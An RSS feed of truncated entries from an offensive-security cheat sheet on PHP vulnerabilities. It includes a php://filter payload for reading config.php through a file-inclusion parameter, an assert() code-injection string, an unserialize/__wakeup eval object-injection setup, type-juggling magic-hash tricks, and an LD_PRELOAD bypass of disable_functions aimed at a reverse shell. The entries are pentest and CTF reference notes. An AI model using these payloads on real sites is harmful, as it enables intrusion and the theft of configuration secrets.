<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>PHP Vulnerabilities on Offensive Security Cheatsheet</title>
    <link>/web-pentest/php-vulnerabilities/</link>
    <description>Recent content in PHP Vulnerabilities on Offensive Security Cheatsheet</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language><atom:link href="/web-pentest/php-vulnerabilities/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>PHP Filters</title>
      <link>/web-pentest/php-vulnerabilities/php_filters/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/php-vulnerabilities/php_filters/</guid>
      <description>PHP Filters # Base64 ?inc=php://filter/read=convert.base64-encode/resource=config.php # iconv conversion filter can be used (https://gynvael.coldwind.pl/?lang=en&amp;amp;id=671) # allows you to use iconv to convert all processed data from charset A to charset B # where both character sets can be chosen from a surprisingly long list of supported encodings iconv -l # Example &amp;lt;?php $url = &amp;#34;php://filter/convert.iconv.UTF-8%2fUTF-7/resource=data:,some&amp;lt;&amp;gt;text&amp;#34;; echo file_get_contents($url); // Output: // some+ADwAPg-text # Then you can use it to change the charset of your payload php://filter/convert.</description>
    </item>
    
    <item>
      <title>PHP Functions</title>
      <link>/web-pentest/php-vulnerabilities/functions/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/php-vulnerabilities/functions/</guid>
      <description>Assert() # The assert() function will execute code in params # Example using challenge ?page=.. Warning : assert() : Assertion &amp;#34;strpos(’includes/...php’, ’..’) === false&amp;#34; failed in path/index.php on line 8 # The request looks like this assert(&amp;#34;strpos(&amp;#39;includes/&amp;#39; . $_GET[&amp;#39;page&amp;#39;] . &amp;#39;.php&amp;#39;, &amp;#39;..&amp;#39;) === false&amp;#34;) # If we inject this ?page=salade.php&amp;#39;,&amp;#39;..&amp;#39;) || print(&amp;#39;tomate&amp;#39;) || strpos(&amp;#39;oignons # The request will look like assert(&amp;#34;strpos(&amp;#39;/includes/salade.php&amp;#39;,&amp;#39;..&amp;#39;) || print(&amp;#39;tomate&amp;#39;) || strpos(&amp;#39;oignons.php&amp;#39;,&amp;#39;..&amp;#39;) ===false&amp;#34;) # Then, to exploit ?</description>
    </item>
    
    <item>
      <title>PHP Serialization</title>
      <link>/web-pentest/php-vulnerabilities/serialization/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/php-vulnerabilities/serialization/</guid>
      <description>Resources https://www.owasp.org/index.php/PHP_Object_Injection PHP Serialisation (PHP Slim __wakeup) # Context - \App\Controller\Confidential.php $systemCall = new SystemCall(&amp;#39;system(&amp;#34;ls&amp;#34;);&amp;#39;); if($rank === UserRankService::ADMIN_RANK){ $app-&amp;gt;render(&amp;#39;front/confidential.twig&amp;#39;, array(&amp;#39;admin&amp;#39; =&amp;gt; $rank, &amp;#39;systemCall&amp;#39; =&amp;gt; $systemCall)); }else { $app-&amp;gt;redirect(&amp;#39;/connexion&amp;#39;, &amp;#39;/connexion&amp;#39;, 301); } # Context - \Slim\Middleware\SessionCookie.php if ($value) { try { $_SESSION = unserialize($value); } catch (\Exception $e) { $this-&amp;gt;app-&amp;gt;getLog()-&amp;gt;error(&amp;#39;Error unserializing session cookie value! &amp;#39; . $e-&amp;gt;getMessage()); } # Context - \App\Service\SystemCall.php class SystemCall { public $hook; public $result; function __construct($hook) { $this-&amp;gt;hook = $hook; } function __wakeup() { $this-&amp;gt;result = eval($this-&amp;gt;hook); } function call() { $this-&amp;gt;__wakeup(); } } # You can override the __wakeup() method by crafting your own object and then inject it to execute command # The cookie value is unserialized and then evaluated # Base cookie a:2:{s:10:&amp;#34;slim.</description>
    </item>
    
    <item>
      <title>PHP Type Juggling</title>
      <link>/web-pentest/php-vulnerabilities/type_juggling/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/php-vulnerabilities/type_juggling/</guid>
      <description>Type Juggling and Loose Comparison # Type Juggling # In PHP, “==” returns true if $a equals $b AFTER transtyping &amp;#34;0000&amp;#34; == int(0) -&amp;gt; TRUE &amp;#34;0e12&amp;#34; == int(0) -&amp;gt; TRUE &amp;#34;1abc&amp;#34; == int(1) -&amp;gt; TRUE &amp;#34;0abc&amp;#34; == int(0) -&amp;gt; TRUE &amp;#34;abc&amp;#34; == int(0) -&amp;gt; TRUE # Loose Comparison # In PHP, if “==” is used, then 2 strings beginning by “0e” and filled with numbers will always be equal # It means that you can use magic hashes (0exxxx.</description>
    </item>
    
    <item>
      <title>Tricks &amp; Others</title>
      <link>/web-pentest/php-vulnerabilities/tricks_others/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/php-vulnerabilities/tricks_others/</guid>
      <description>Code auditing / Looking for vulnerabilities https://github.com/dustyfresh/PHP-vulnerability-audit-cheatsheet Bypass PHP disable_functions and open_basedir # PHP in Linux calls a binary (sendmail) when the mail() function is executed.  # If we have putenv() allowed, we can set the environment variable &amp;#34;LD_PRELOAD&amp;#34;, so we can  # preload an arbitrary shared object. Our shared object will execute our custom  # payload (a binary or a bash script) without the PHP restrictions, so we can have a reverse shell, for example.</description>
    </item>
    
  </channel>
</rss>
